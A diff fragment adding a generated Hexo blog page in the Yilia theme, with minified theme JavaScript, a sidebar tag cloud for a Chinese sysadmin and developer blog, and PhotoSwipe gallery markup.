n}),r[1]=n,C.apply(N,r)}}}),L[k][q]||e(5)(L[k],q,L[k].valueOf),l(L,"Symbol"),l(Math,"Math",!0),l(r.JSON,"JSON",!0)},function(t,n,e){e(25)("asyncIterator")},function(t,n,e){e(25)("observable")},function(t,n,e){e(62);for(var r=e(1),o=e(5),i=e(17),u=e(7)("toStringTag"),f=["NodeList","DOMTokenList","MediaList","StyleSheetList","CSSRuleList"],c=0;c<5;c++){var a=f[c],s=r[a],l=s&&s.prototype;l&&!l[u]&&o(l,u,a),i[a]=i.Array}},function(t,n){"use strict";var e={versions:function(){var t=window.navigator.userAgent;return{trident:t.indexOf("Trident")>-1,presto:t.indexOf("Presto")>-1,webKit:t.indexOf("AppleWebKit")>-1,gecko:t.indexOf("Gecko")>-1&&t.indexOf("KHTML")==-1,mobile:!!t.match(/AppleWebKit.*Mobile.*/),ios:!!t.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),android:t.indexOf("Android")>-1||t.indexOf("Linux")>-1,iPhone:t.indexOf("iPhone")>-1||t.indexOf("Mac")>-1,iPad:t.indexOf("iPad")>-1,webApp:t.indexOf("Safari")==-1,weixin:t.indexOf("MicroMessenger")==-1}}()};t.exports=e},function(t,n,e){"use strict";function r(t){return t&&t.__esModule?t:{default:t}}var o=e(40),i=r(o),u=function(){function t(t,n,e){return n||e?String.fromCharCode(n||e):o[t]||t}function n(t){return l[t]}var e=/&quot;|&lt;|&gt;|&amp;|&nbsp;|&apos;|&#(\d+);|&#(\d+)/g,r=/['<> "&]/g,o={"&quot;":'"',"&lt;":"<","&gt;":">","&amp;":"&","&nbsp;":" "},f=/\u00a0/g,c=/<br\s*\/?>/gi,a=/\r?\n/g,s=/\s/g,l={};for(var p in o)l[o[p]]=p;return o["&apos;"]="'",l["'"]="&#39;",{encode:function(t){return t?(""+t).replace(r,n).replace(a,"<br/>").replace(s,"&nbsp;"):""},decode:function(n){return n?(""+n).replace(c,"\n").replace(e,t).replace(f," "):""},encodeBase16:function(t){if(!t)return t;t+="";for(var n=[],e=0,r=t.length;r>e;e++)n.push(t.charCodeAt(e).toString(16).toUpperCase());return n.join("")},encodeBase16forJSON:function(t){if(!t)return t;t=t.replace(/[\u4E00-\u9FBF]/gi,function(t){return escape(t).replace("%u","\\u")});for(var n=[],e=0,r=t.length;r>e;e++)n.push(t.charCodeAt(e).toString(16).toUpperCase());return n.join("")},decodeBase16:function(t){if(!t)return t;t+="";for(var n=[],e=0,r=t.length;r>e;e+=2)n.push(String.fromCharCode("0x"+t.slice(e,e+2)));return n.join("")},encodeObject:function(t){if(t instanceof Array)for(var n=0,e=t.length;e>n;n++)t[n]=u.encodeObject(t[n]);else if("object"==("undefined"==typeof t?"undefined":(0,i.default)(t)))for(var r in t)t[r]=u.encodeObject(t[r]);else if("string"==typeof t)return u.encode(t);return t},loadScript:function(t){var n=document.createElement("script");document.getElementsByTagName("body")[0].appendChild(n),n.setAttribute("src",t)},addLoadEvent:function(t){var n=window.onload;"function"!=typeof window.onload?window.onload=t:window.onload=function(){n(),t()}}}}();t.exports=u},function(t,n){function e(t,n){t.classList?t.classList.add(n):t.className+=" "+n}t.exports=e},function(t,n){function e(t,n){if(t.classList)t.classList.remove(n);else{var e=new RegExp("(^|\\b)"+n.split(" ").join("|")+"(\\b|$)","gi");t.className=t.className.replace(e," ")}}t.exports=e},,,function(t,n){"use strict";function e(){var t=document.querySelector("#page-nav");if(t&&!document.querySelector("#page-nav .extend.prev")&&(t.innerHTML='<a class="extend prev disabled" rel="prev">&laquo; Prev</a>'+t.innerHTML),t&&!document.querySelector("#page-nav .extend.next")&&(t.innerHTML=t.innerHTML+'<a class="extend next disabled" rel="next">Next &raquo;</a>'),yiliaConfig&&yiliaConfig.open_in_new){var n=document.querySelectorAll(".article-entry a:not(.article-more-a)");n.forEach(function(t){t.setAttribute("target","_blank")})}var e=document.querySelector("#js-aboutme");e&&0!==e.length&&(e.innerHTML=e.innerText)}t.exports={init:e}},,,,,,,,,function(t,n){function e(t,n){if("string"==typeof n)return t.insertAdjacentHTML("afterend",n);var e=t.nextSibling;return e?t.parentNode.insertBefore(n,e):t.parentNode.appendChild(n)}t.exports=e}])</script><script src="/./main.2d7529.js"></script><script>!function(){var e=function(e){var t=document.createElement("script");document.getElementsByTagName("body")[0].appendChild(t),t.setAttribute("src",e)};e("/slider.885efe.js")}()</script>
+
+
+    
+<div class="tools-col" q-class="show:isShow,hide:isShow|isFalse" q-on="click:stop(e)">
+  <div class="tools-nav header-menu">
+    
+    
+      
+      
+      
+    
+      
+      
+      
+    
+    
+
+    <ul style="width: 70%">
+    
+    
+      
+      <li style="width: 50%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章</a></li>
+      
+        
+      
+      <li style="width: 50%" q-on="click: openSlider(e, 'aboutme')"><a href="javascript:void(0)" q-class="active:aboutme">关于我</a></li>
+      
+        
+    </ul>
+  </div>
+  <div class="tools-wrap">
+    
+    	<section class="tools-section tools-section-all" q-show="innerArchive">
+        <div class="search-wrap">
+          <input class="search-ipt" q-model="search" type="text" placeholder="find something…">
+          <i class="icon-search icon" q-show="search|isEmptyStr"></i>
+          <i class="icon-close icon" q-show="search|isNotEmptyStr" q-on="click:clearChose(e)"></i>
+        </div>
+        <div class="widget tagcloud search-tag">
+          <p class="search-tag-wording">tag:</p>
+          <label class="search-switch">
+            <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
+          </label>
+          <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">ajax</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">setInterval</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">ajax作用域</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">ajax同步</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">ajax异步</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">ajax返回值</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">ffmpeg</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">mencoder</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">nginx</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">x.264</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">codis</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">redis-cli</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">geoip</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">kibana</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">export-csv</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">exporting</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">highcharts</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">highcharts to pdf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">html to pdf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">shell_exec()</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">wkhtmltopdf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">页面生成pdf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">mongodb</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">elasticsearch</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">logstash</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">mongo-replcation</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">mongo主从</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">mysql</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">replication</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">24小时内重复记录</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">mysql查询重复记录</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">mysql日期间隔查询</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">todays</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">天数排序</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">自定义时间间隔</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">php</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">php_array</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">show_array</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">redis-crackit</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">redis漏洞</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">ansible</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ssh</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">svn</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">samba</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">smbclient</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">awk</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">iptables</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">socks</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">switchyOmega</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">tunnel</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">svn update</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">S方法</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">thinkphp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">数据缓存</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">mongo or查询</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">_complex</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">_logic=&gt;"or"</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">报表浏览权限</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">权限控制</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">mongo</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">update_mongo</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">ClustrMaps</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">wordpress</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">cnzz</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">WP-PostViews</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">zabbix-2.5.0</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">weixin</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">zabbix</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">zabbix-api</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">JMX</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">zabbix-java-gateway</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">netstat</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">tcp_connections</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">zabbix_get</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">sendEmail</a>
+              </li>
+            
+            <div class="clearfix"></div>
+          </ul>
+        </div>
+        <ul class="search-ul">
+          <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
+            缺失模块。<br/>1、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
+            2、在根目录_config.yml里添加配置：
+<pre style="font-size: 12px;" q-show="jsonFail">
+  jsonContent:
+    meta: false
+    pages: false
+    posts:
+      title: true
+      date: true
+      path: true
+      text: true
+      raw: false
+      content: false
+      slug: false
+      updated: false
+      comments: false
+      link: false
+      permalink: false
+      excerpt: false
+      categories: false
+      tags: true
+</pre>
+          </p>
+          <li class="search-li" q-repeat="items" q-show="isShow">
+            <a q-attr="href:path|urlformat" class="search-title"><i class="icon-quo-left icon"></i><span q-text="title"></span></a>
+            <p class="search-time">
+              <i class="icon-calendar icon"></i>
+              <span q-text="date|dateformat"></span>
+            </p>
+            <p class="search-tag">
+              <i class="icon-price-tags icon"></i>
+              <span q-repeat="tags" q-on="click:choseTag(e, name)" q-text="name|tagformat"></span>
+            </p>
+          </li>
+        </ul>
+    	</section>
+    
+
+    
+
+    
+    	<section class="tools-section tools-section-me" q-show="aboutme">
+  	  	
+  	  		<div class="aboutme-wrap" id="js-aboutme">很惭愧&lt;br&gt;&lt;br&gt;只做了一点微小的工作&lt;br&gt;谢谢大家</div>
+  	  	
+    	</section>
+    
+  </div>
+  
+</div>
+    <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+  </div>
+</body>
+</html>
